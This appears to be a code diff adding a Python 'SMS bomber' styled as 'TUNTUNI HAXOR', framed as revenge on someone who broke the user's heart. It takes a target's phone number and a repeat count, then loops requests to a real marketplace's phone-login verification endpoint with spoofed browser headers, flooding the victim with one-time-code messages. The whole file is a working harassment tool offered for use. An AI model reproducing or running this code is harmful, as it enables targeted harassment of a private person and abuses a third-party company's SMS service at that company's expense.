@@ -1,0 +1,61 @@
+import os
+
+try: 
+    import requests
+    import pyfiglet
+
+except:
+    os.system("pip install pyfiglet")
+    os.system("pip install requests")
+
+import pyfiglet as pyg
+import requests
+from requests.structures import CaseInsensitiveDict
+
+biblack="\033[1;90m"      # Black
+bired="\033[1;91m"        # Red
+bigreen="\033[1;92m"      # Green
+biyellow="\033[1;93m"     # Yellow
+biblue="\033[1;94m"       # Blue
+bipurple="\033[1;95m"     # Purple
+bicyan="\033[1;96m"       # Cyan
+biehite="\033[1;97m"      # White
+
+os.system("clear")
+
+slogan2="""
+\t\t.................LOVE MEANS PAIN...................\n
+\t\t   ........SHE HAS BEEN  BROKEN MY HEART.........\n
+      
+"""
+
+
+
+print(bigreen+"\n\t\t      ......Welcome To Tuntuni`s World........\n\n")
+print(pyg.figlet_format('TUNTUNI  HAXOR',justify="center",font="standard"))
+print(slogan2)
+
+name=str(input("\nWho Broken Your Heart:-"))
+print(name+ " Is Very Selfish....\n")
+number=str(input("\nGive Me His/Her Number:- "))
+amount=int(input("\nHow Much You Cried For Her:- "))
+
+url = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="+number
+
+headers = CaseInsensitiveDict()
+headers["Host"] = "bikroy.com"
+headers["accept"] = "application/json, text/plain, */*"
+headers["accept-language"] = "bn"
+headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
+headers["application-name"] = "web"
+headers["x-requested-with"] = "mark.via.gp"
+headers["sec-fetch-site"] = "same-origin"
+headers["sec-fetch-mode"] = "cors"
+headers["sec-fetch-dest"] = "empty"
+headers["referer"] = "https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options"
+headers["accept-encoding"] = "gzip, deflate"
+headers["cookie"] = "ab-test.pwa-only=reactapp"
+
+for i in range(amount):
+  resp = requests.get(url, headers=headers)
+  print(str(i+1)+"  Kicked..Don't Cry.. Stay With Me\n")
